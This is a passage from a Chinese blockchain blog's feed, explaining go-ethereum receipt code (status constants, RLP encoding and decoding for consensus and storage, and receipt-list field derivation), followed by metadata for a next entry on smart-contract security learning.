receiptStatusFailedRLP     = []<span class="type">byte</span>&#123;&#125;     <span class="comment">//收据状态为失败的 RLP 编码</span></span><br><span class="line">   receiptStatusSuccessfulRLP = []<span class="type">byte</span>&#123;<span class="number">0x01</span>&#125; <span class="comment">//收据状态为成功的 RLP 编码</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This error is returned when a typed receipt is decoded, but the string is empty.</span></span><br><span class="line"><span class="keyword">var</span> errEmptyTypedReceipt = errors.New(<span class="string">&quot;empty typed receipt bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">   <span class="comment">// ReceiptStatusFailed is the status code of a transaction if execution failed.</span></span><br><span class="line">   ReceiptStatusFailed = <span class="type">uint64</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">// ReceiptStatusSuccessful is the status code of a transaction if execution succeeded.</span></span><br><span class="line">   ReceiptStatusSuccessful = <span class="type">uint64</span>(<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="编码">编码</h2><p>以太坊的数据都是编码后以字典树的形式存储，依靠哈希索引寻找值。因此，对于会写入数据库的内容，总是需要对应的编码和解码。编码和解码又分成了死否写入传入的接口还是直接返回编码的字节。由于交易的内容会逐渐拓展（如类型、新的编码方式），编码会越来越复杂。此处不做详细介绍，当需要研究编码时再回头看。</p><h3 id="共识检查时的编码和解码"><strong>共识检查时的编码和解码</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// EncodeRLP implements rlp.Encoder, and flattens the consensus fields of a receipt</span></span><br><span class="line"><span class="comment">// into an RLP stream. If no post state is present, byzantium fork is assumed.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> EncodeRLP(w io.Writer) <span class="type">error</span> &#123;</span><br><span class="line">data := &amp;receiptRLP&#123;r.statusEncoding(), r.CumulativeGasUsed, r.Bloom, r.Logs&#125;</span><br><span class="line"><span class="keyword">if</span> r.Type == LegacyTxType &#123;</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w, data)</span><br><span class="line">&#125;</span><br><span class="line">buf := encodeBufferPool.Get().(*bytes.Buffer)</span><br><span class="line"><span class="keyword">defer</span> encodeBufferPool.Put(buf)</span><br><span class="line">buf.Reset()</span><br><span class="line"><span class="keyword">if</span> err := r.encodeTyped(data, buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w, buf.Bytes())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encodeTyped writes the canonical encoding of a typed receipt to w.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> encodeTyped(data *receiptRLP, w *bytes.Buffer) <span class="type">error</span> &#123;</span><br><span class="line">w.WriteByte(r.Type)</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MarshalBinary returns the consensus encoding of the receipt.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> MarshalBinary() ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> r.Type == LegacyTxType &#123;</span><br><span class="line"><span class="keyword">return</span> rlp.EncodeToBytes(r)</span><br><span class="line">&#125;</span><br><span class="line">data := &amp;receiptRLP&#123;r.statusEncoding(), r.CumulativeGasUsed, r.Bloom, r.Logs&#125;</span><br><span class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line">err := r.encodeTyped(data, &amp;buf)</span><br><span class="line"><span class="keyword">return</span> buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DecodeRLP implements rlp.Decoder, and loads the consensus fields of a receipt</span></span><br><span class="line"><span class="comment">// from an RLP stream.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> DecodeRLP(s *rlp.Stream) <span class="type">error</span> &#123;</span><br><span class="line">kind, _, err := s.Kind()</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> err != <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line"><span class="keyword">case</span> kind == rlp.List:</span><br><span class="line"><span class="comment">// It&#x27;s a legacy receipt.</span></span><br><span class="line"><span class="keyword">var</span> dec receiptRLP</span><br><span class="line"><span class="keyword">if</span> err := s.Decode(&amp;dec); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">r.Type = LegacyTxType</span><br><span class="line"><span class="keyword">return</span> r.setFromRLP(dec)</span><br><span class="line"><span class="keyword">case</span> kind == rlp.String:</span><br><span class="line"><span class="comment">// It&#x27;s an EIP-2718 typed tx receipt.</span></span><br><span class="line">b, err := s.Bytes()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(b) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> errEmptyTypedReceipt</span><br><span class="line">&#125;</span><br><span class="line">r.Type = b[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> r.Type == AccessListTxType || r.Type == DynamicFeeTxType &#123;</span><br><span class="line"><span class="keyword">var</span> dec receiptRLP</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(b[<span class="number">1</span>:], &amp;dec); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> r.setFromRLP(dec)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ErrTxTypeNotSupported</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> rlp.ErrExpectedList</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnmarshalBinary decodes the consensus encoding of receipts.</span></span><br><span class="line"><span class="comment">// It supports legacy RLP receipts and EIP-2718 typed receipts.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> UnmarshalBinary(b []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(b) &gt; <span class="number">0</span> &amp;&amp; b[<span class="number">0</span>] &gt; <span class="number">0x7f</span> &#123;</span><br><span class="line"><span class="comment">// It&#x27;s a legacy receipt decode the RLP</span></span><br><span class="line"><span class="keyword">var</span> data receiptRLP</span><br><span class="line">err := rlp.DecodeBytes(b, &amp;data)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">r.Type = LegacyTxType</span><br><span class="line"><span class="keyword">return</span> r.setFromRLP(data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// It&#x27;s an EIP2718 typed transaction envelope.</span></span><br><span class="line"><span class="keyword">return</span> r.decodeTyped(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decodeTyped decodes a typed receipt from the canonical format.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> decodeTyped(b []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(b) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> errEmptyTypedReceipt</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> b[<span class="number">0</span>] &#123;</span><br><span class="line"><span class="keyword">case</span> DynamicFeeTxType, AccessListTxType:</span><br><span class="line"><span class="keyword">var</span> data receiptRLP</span><br><span class="line">err := rlp.DecodeBytes(b[<span class="number">1</span>:], &amp;data)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">r.Type = b[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> r.setFromRLP(data)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> ErrTxTypeNotSupported</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Receipt)</span></span> setFromRLP(data receiptRLP) <span class="type">error</span> &#123;</span><br><span class="line">r.CumulativeGasUsed, r.Bloom, r.Logs = data.CumulativeGasUsed, data.Bloom, data.Logs</span><br><span class="line"><span class="keyword">return</span> r.setStatus(data.PostStateOrStatus)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="写入存储的编码和解码"><strong>写入存储的编码和解码</strong></h3><p>区别在于这里写入了 log。首先为了区分上面提到的编码和接下来提到的编码，设置了不同的别名。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ReceiptForStorage is a wrapper around a Receipt that flattens and parses the</span></span><br><span class="line"><span class="comment">// entire content of a receipt, as opposed to only the consensus fields originally.</span></span><br><span class="line"><span class="keyword">type</span> ReceiptForStorage Receipt</span><br></pre></td></tr></table></figure><p>接下来，也是一堆的编码和解码函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// EncodeRLP implements rlp.Encoder, and flattens all content fields of a receipt</span></span><br><span class="line"><span class="comment">// into an RLP stream.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *ReceiptForStorage)</span></span> EncodeRLP(w io.Writer) <span class="type">error</span> &#123;</span><br><span class="line">enc := &amp;storedReceiptRLP&#123;</span><br><span class="line">PostStateOrStatus: (*Receipt)(r).statusEncoding(),</span><br><span class="line">CumulativeGasUsed: r.CumulativeGasUsed,</span><br><span class="line">Logs:              <span class="built_in">make</span>([]*LogForStorage, <span class="built_in">len</span>(r.Logs)),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, log := <span class="keyword">range</span> r.Logs &#123;</span><br><span class="line">enc.Logs[i] = (*LogForStorage)(log)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w, enc)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DecodeRLP implements rlp.Decoder, and loads both consensus and implementation</span></span><br><span class="line"><span class="comment">// fields of a receipt from an RLP stream.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *ReceiptForStorage)</span></span> DecodeRLP(s *rlp.Stream) <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// Retrieve the entire receipt blob as we need to try multiple decoders</span></span><br><span class="line">blob, err := s.Raw()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Try decoding from the newest format for future proofness, then the older one</span></span><br><span class="line"><span class="comment">// for old nodes that just upgraded. V4 was an intermediate unreleased format so</span></span><br><span class="line"><span class="comment">// we do need to decode it, but it&#x27;s not common (try last).</span></span><br><span class="line"><span class="keyword">if</span> err := decodeStoredReceiptRLP(r, blob); err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := decodeV3StoredReceiptRLP(r, blob); err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decodeV4StoredReceiptRLP(r, blob)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decodeStoredReceiptRLP</span><span class="params">(r *ReceiptForStorage, blob []<span class="type">byte</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> stored storedReceiptRLP</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(blob, &amp;stored); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := (*Receipt)(r).setStatus(stored.PostStateOrStatus); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">r.CumulativeGasUsed = stored.CumulativeGasUsed</span><br><span class="line">r.Logs = <span class="built_in">make</span>([]*Log, <span class="built_in">len</span>(stored.Logs))</span><br><span class="line"><span class="keyword">for</span> i, log := <span class="keyword">range</span> stored.Logs &#123;</span><br><span class="line">r.Logs[i] = (*Log)(log)</span><br><span class="line">&#125;</span><br><span class="line">r.Bloom = CreateBloom(Receipts&#123;(*Receipt)(r)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decodeV4StoredReceiptRLP</span><span class="params">(r *ReceiptForStorage, blob []<span class="type">byte</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> stored v4StoredReceiptRLP</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(blob, &amp;stored); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := (*Receipt)(r).setStatus(stored.PostStateOrStatus); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">r.CumulativeGasUsed = stored.CumulativeGasUsed</span><br><span class="line">r.TxHash = stored.TxHash</span><br><span class="line">r.ContractAddress = stored.ContractAddress</span><br><span class="line">r.GasUsed = stored.GasUsed</span><br><span class="line">r.Logs = <span class="built_in">make</span>([]*Log, <span class="built_in">len</span>(stored.Logs))</span><br><span class="line"><span class="keyword">for</span> i, log := <span class="keyword">range</span> stored.Logs &#123;</span><br><span class="line">r.Logs[i] = (*Log)(log)</span><br><span class="line">&#125;</span><br><span class="line">r.Bloom = CreateBloom(Receipts&#123;(*Receipt)(r)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decodeV3StoredReceiptRLP</span><span class="params">(r *ReceiptForStorage, blob []<span class="type">byte</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> stored v3StoredReceiptRLP</span><br><span class="line"><span class="keyword">if</span> err := rlp.DecodeBytes(blob, &amp;stored); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := (*Receipt)(r).setStatus(stored.PostStateOrStatus); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">r.CumulativeGasUsed = stored.CumulativeGasUsed</span><br><span class="line">r.Bloom = stored.Bloom</span><br><span class="line">r.TxHash = stored.TxHash</span><br><span class="line">r.ContractAddress = stored.ContractAddress</span><br><span class="line">r.GasUsed = stored.GasUsed</span><br><span class="line">r.Logs = <span class="built_in">make</span>([]*Log, <span class="built_in">len</span>(stored.Logs))</span><br><span class="line"><span class="keyword">for</span> i, log := <span class="keyword">range</span> stored.Logs &#123;</span><br><span class="line">r.Logs[i] = (*Log)(log)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="批量处理">批量处理</h3><p>为了批量处理收据，设置了收据列表和配套的方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Receipts implements DerivableList for receipts.</span></span><br><span class="line"><span class="keyword">type</span> Receipts []*Receipt</span><br></pre></td></tr></table></figure><p>方法包括：获取收据的数量、编码特定索引的收据和封装区块信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Len returns the number of receipts in this list.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rs Receipts)</span></span> Len() <span class="type">int</span> &#123; <span class="keyword">return</span> <span class="built_in">len</span>(rs) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EncodeIndex encodes the i&#x27;th receipt to w.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rs Receipts)</span></span> EncodeIndex(i <span class="type">int</span>, w *bytes.Buffer) &#123;</span><br><span class="line">r := rs[i]</span><br><span class="line">data := &amp;receiptRLP&#123;r.statusEncoding(), r.CumulativeGasUsed, r.Bloom, r.Logs&#125;</span><br><span class="line"><span class="keyword">switch</span> r.Type &#123;</span><br><span class="line"><span class="keyword">case</span> LegacyTxType:</span><br><span class="line">rlp.Encode(w, data)</span><br><span class="line"><span class="keyword">case</span> AccessListTxType:</span><br><span class="line">w.WriteByte(AccessListTxType)</span><br><span class="line">rlp.Encode(w, data)</span><br><span class="line"><span class="keyword">case</span> DynamicFeeTxType:</span><br><span class="line">w.WriteByte(DynamicFeeTxType)</span><br><span class="line">rlp.Encode(w, data)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">// For unsupported types, write nothing. Since this is for</span></span><br><span class="line"><span class="comment">// DeriveSha, the error will be caught matching the derived hash</span></span><br><span class="line"><span class="comment">// to the block.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DeriveFields fills the receipts with their computed fields based on consensus</span></span><br><span class="line"><span class="comment">// data and contextual infos like containing block and transactions.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rs Receipts)</span></span> DeriveFields(config *params.ChainConfig, hash common.Hash, number <span class="type">uint64</span>, txs Transactions) <span class="type">error</span> &#123;</span><br><span class="line">signer := MakeSigner(config, <span class="built_in">new</span>(big.Int).SetUint64(number))</span><br><span class="line"></span><br><span class="line">logIndex := <span class="type">uint</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(txs) != <span class="built_in">len</span>(rs) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;transaction and receipt count mismatch&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(rs); i++ &#123;</span><br><span class="line"><span class="comment">// The transaction type and hash can be retrieved from the transaction itself</span></span><br><span class="line">rs[i].Type = txs[i].Type()</span><br><span class="line">rs[i].TxHash = txs[i].Hash()</span><br><span class="line"></span><br><span class="line"><span class="comment">// block location fields</span></span><br><span class="line">rs[i].BlockHash = hash</span><br><span class="line">rs[i].BlockNumber = <span class="built_in">new</span>(big.Int).SetUint64(number)</span><br><span class="line">rs[i].TransactionIndex = <span class="type">uint</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">// The contract address can be derived from the transaction itself</span></span><br><span class="line"><span class="keyword">if</span> txs[i].To() == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Deriving the signer is expensive, only do if it&#x27;s actually needed</span></span><br><span class="line">from, _ := Sender(signer, txs[i])</span><br><span class="line">rs[i].ContractAddress = crypto.CreateAddress(from, txs[i].Nonce())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// The used gas can be calculated based on previous r</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span> &#123;</span><br><span class="line">rs[i].GasUsed = rs[i].CumulativeGasUsed</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">rs[i].GasUsed = rs[i].CumulativeGasUsed - rs[i<span class="number">-1</span>].CumulativeGasUsed</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// The derived log fields can simply be set from the block and transaction</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="built_in">len</span>(rs[i].Logs); j++ &#123;</span><br><span class="line">rs[i].Logs[j].BlockNumber = number</span><br><span class="line">rs[i].Logs[j].BlockHash = hash</span><br><span class="line">rs[i].Logs[j].TxHash = rs[i].TxHash</span><br><span class="line">rs[i].Logs[j].TxIndex = <span class="type">uint</span>(i)</span><br><span class="line">rs[i].Logs[j].Index = logIndex</span><br><span class="line">logIndex++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>智能合约安全学习路线</title>
    <link href="https://www.blog-blockchain.xyz/audit/smart-contract-learning-path/"/>
    <id>https://www.blog-blockchain.xyz/audit/smart-contract-learning-path/</id>
    <published>2022-08-24T17:33:33.000Z</published>
    <updated>2024-11-18T09:48:36.433Z</updated>
    
